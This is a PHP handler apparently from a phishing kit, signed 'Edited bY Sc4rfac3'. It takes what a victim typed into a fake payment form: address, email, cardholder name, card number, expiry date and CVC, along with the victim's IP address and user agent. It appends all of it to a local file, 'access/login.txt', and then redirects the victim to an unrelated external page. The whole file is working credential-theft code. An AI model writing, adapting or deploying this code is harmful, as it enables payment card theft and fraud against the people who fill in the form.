<?php

if (isset($_POST['btn2'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "PAIS          : ".$_POST['pais']."\n";
	$message .= "ESTADO              : ".$_POST['estado']."\n";
	$message .= "ESTADO2             : ".$_POST['estado2']."\n";
	$message .= "Calle               : ".$_POST['calle']."\n";

	$message .= "Ciudad               : ".$_POST['city']."\n";

	$message .= "Codigo postal               : ".$_POST['cp']."\n";

	$message .= "EMAIL               : ".$_POST['email']."\n";

	$message .= "Nombre               : ".$_POST['cname']."\n";
	$message .= "Numero cc               : ".$_POST['cnumber']."\n";
	$message .= "Mes              : ".$_POST['mm']."\n";
	$message .= "Año              : ".$_POST['aaaa']."\n";
	$message .= "CVC              : ".$_POST['cvc']."\n";

	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- Edited bY Sc4rfac3 --------------|\n";

	
	$save=fopen("access/login.txt","a+");
	          fwrite($save,$message);
	          fclose($save);

	          $discoverbank = [
              'text' => $message
              ]; 

		header("Location: https://onlyfans.com/hopebeel");

	
}

?>